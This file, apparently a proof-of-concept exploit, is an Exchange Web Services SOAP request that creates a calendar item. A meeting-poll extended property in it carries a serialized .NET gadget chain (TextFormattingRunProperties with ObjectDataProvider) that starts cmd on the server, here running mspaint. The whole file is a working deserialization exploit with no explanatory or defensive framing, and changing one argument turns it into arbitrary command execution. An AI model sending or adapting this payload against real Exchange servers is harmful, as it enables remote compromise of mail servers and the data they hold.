NSAPayload1.xml

<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types" 
               xmlns:soap="http://www.w3.org/2003/05/soap-envelope">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2016" />
    <t:TimeZoneContext>
      <t:TimeZoneDefinition Name="(UTC-08:00) Pacific Time (US &amp;amp; Canada)" Id="Pacific Standard Time">
        <t:Periods>
          <t:Period Bias="P0DT8H0M0.0S" Name="Standard" Id="Std" />
          <t:Period Bias="P0DT7H0M0.0S" Name="Daylight" Id="Dlt/1" />
          <t:Period Bias="P0DT7H0M0.0S" Name="Daylight" Id="Dlt/2007" />
        </t:Periods>
        <t:TransitionsGroups>
          <t:TransitionsGroup Id="0">
            <t:RecurringDayTransition>
              <t:To Kind="Period">Dlt/1</t:To>
              <t:TimeOffset>P0DT2H0M0.0S</t:TimeOffset>
              <t:Month>4</t:Month>
              <t:DayOfWeek>Sunday</t:DayOfWeek>
              <t:Occurrence>1</t:Occurrence>
            </t:RecurringDayTransition>
            <t:RecurringDayTransition>
              <t:To Kind="Period">Std</t:To>
              <t:TimeOffset>P0DT2H0M0.0S</t:TimeOffset>
              <t:Month>10</t:Month>
              <t:DayOfWeek>Sunday</t:DayOfWeek>
              <t:Occurrence>-1</t:Occurrence>
            </t:RecurringDayTransition>
          </t:TransitionsGroup>
          <t:TransitionsGroup Id="1">
            <t:RecurringDayTransition>
              <t:To Kind="Period">Dlt/2007</t:To>
              <t:TimeOffset>P0DT2H0M0.0S</t:TimeOffset>
              <t:Month>3</t:Month>
              <t:DayOfWeek>Sunday</t:DayOfWeek>
              <t:Occurrence>2</t:Occurrence>
            </t:RecurringDayTransition>
            <t:RecurringDayTransition>
              <t:To Kind="Period">Std</t:To>
              <t:TimeOffset>P0DT2H0M0.0S</t:TimeOffset>
              <t:Month>11</t:Month>
              <t:DayOfWeek>Sunday</t:DayOfWeek>
              <t:Occurrence>1</t:Occurrence>
            </t:RecurringDayTransition>
          </t:TransitionsGroup>
        </t:TransitionsGroups>
        <t:Transitions>
          <t:Transition>
            <t:To Kind="Group">0</t:To>
          </t:Transition>
          <t:AbsoluteDateTransition>
            <t:To Kind="Group">1</t:To>
            <t:DateTime>2007-01-01T08:00:00.000Z</t:DateTime>
          </t:AbsoluteDateTransition>
        </t:Transitions>
      </t:TimeZoneDefinition>
    </t:TimeZoneContext>
  </soap:Header>
  <soap:Body>
    <m:CreateItem SendMeetingInvitations="SendToAllAndSaveCopy">
      <m:Items>
        <t:CalendarItem>
          <t:Subject>Weekly Meeting Update</t:Subject>
			<t:ExtendedProperty>
			<t:ExtendedFieldURI PropertySetId="11000e07-b51b-40d6-af21-caa85edab1d0"
			              PropertyName="MeetingPollProposeOptionsRequestsBlob" PropertyType="String" />
			            <t:Value>&lt;ArrayOfKeyValueOfstringProposeOptionsMeetingPollParametersE_S0982HC z:Id=&quot;1&quot; z:Size=&quot;1&quot; xmlns=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot; xmlns:i=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:z=&quot;http://schemas.microsoft.com/2003/10/Serialization/&quot;&gt;
	&lt;KeyValueOfstringProposeOptionsMeetingPollParametersE_S0982HC&gt;
		&lt;Key z:Id=&quot;2&quot;&gt;meeting&lt;/Key&gt;
		&lt;Value z:Id=&quot;3&quot;&gt;
			&lt;ChangedProperties xmlns=&quot;http://schemas.datacontract.org/2004/07/Microsoft.Exchange.Entities.DataModel&quot; xmlns:b=&quot;http://schemas.datacontract.org/2004/07/Microsoft.Exchange.Entities.DataModel.PropertyBags&quot;&gt;
				&lt;b:propertyValues z:Size=&quot;1&quot; xmlns:c=&quot;http://schemas.microsoft.com/2003/10/Serialization/Arrays&quot;&gt;
					&lt;c:KeyValueOfstringanyType&gt;
						&lt;c:Key&gt;test&lt;/c:Key&gt;
                        &lt;c:Value i:type=&quot;a:Microsoft.VisualStudio.Text.Formatting.TextFormattingRunProperties&quot; xmlns:a=&quot;Microsoft.PowerShell.Editor, Version=3.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot; xmlns:x=&quot;mscorlib&quot;&gt;
						&lt;ForegroundBrush i:type=&quot;x:System.String&quot; xmlns=&quot;&quot;&gt;&lt;![CDATA[&lt;ObjectDataProvider MethodName=&quot;Start&quot; xmlns=&quot;http://schemas.microsoft.com/winfx/2006/xaml/presentation&quot; xmlns:a=&quot;clr-namespace:System.Diagnostics;assembly=System&quot;&gt;&lt;ObjectDataProvider.ObjectInstance&gt;&lt;a:Process&gt;&lt;a:Process.StartInfo&gt;&lt;a:ProcessStartInfo Arguments=&quot;/c mspaint&quot; FileName=&quot;cmd&quot;/&gt;&lt;/a:Process.StartInfo&gt;&lt;/a:Process&gt;&lt;/ObjectDataProvider.ObjectInstance&gt;&lt;/ObjectDataProvider&gt;]]&gt;&lt;/ForegroundBrush&gt;
                        &lt;/c:Value&gt;
					&lt;/c:KeyValueOfstringanyType&gt;
				&lt;/b:propertyValues&gt;
			&lt;/ChangedProperties&gt;
			&lt;OriginalTypeAssembly z:Id=&quot;12&quot; i:nil=&quot;true&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/Microsoft.Exchange.Entities.DataModel&quot;&gt;Microsoft.Exchange.Entities.DataModel&lt;/OriginalTypeAssembly&gt;
			&lt;OriginalTypeName z:Id=&quot;14&quot; xmlns=&quot;http://schemas.datacontract.org/2004/07/Microsoft.Exchange.Entities.DataModel&quot;&gt;Microsoft.Exchange.Entities.DataModel.Calendaring.CustomActions.ProposeOptionsMeetingPollParameters&lt;/OriginalTypeName&gt;
		&lt;/Value&gt;
	&lt;/KeyValueOfstringProposeOptionsMeetingPollParametersE_S0982HC&gt;
&lt;/ArrayOfKeyValueOfstringProposeOptionsMeetingPollParametersE_S0982HC&gt;</t:Value>
			</t:ExtendedProperty>
          <t:Body BodyType="HTML">TBC</t:Body>
          <t:ReminderMinutesBeforeStart>30</t:ReminderMinutesBeforeStart>
          <t:Start>2021-05-10T06:45:32.868-08:00</t:Start>
          <t:End>2021-05-10T06:55:32.868-08:00</t:End>
          <t:Location>Program TBC</t:Location>
          <t:RequiredAttendees>
            <t:Attendee>
              <t:Mailbox>
                <t:EmailAddress>foobar@foo.local</t:EmailAddress>
              </t:Mailbox>
            </t:Attendee>
          </t:RequiredAttendees>
          <t:Recurrence>
            <t:DailyRecurrence>
              <t:Interval>1</t:Interval>
            </t:DailyRecurrence>
            <t:NumberedRecurrence>
              <t:StartDate>2021-05-10T06:45:32.868-08:00</t:StartDate>
              <t:NumberOfOccurrences>2</t:NumberOfOccurrences>
            </t:NumberedRecurrence>
          </t:Recurrence>
        </t:CalendarItem>
      </m:Items>
    </m:CreateItem>
  </soap:Body>
</soap:Envelope>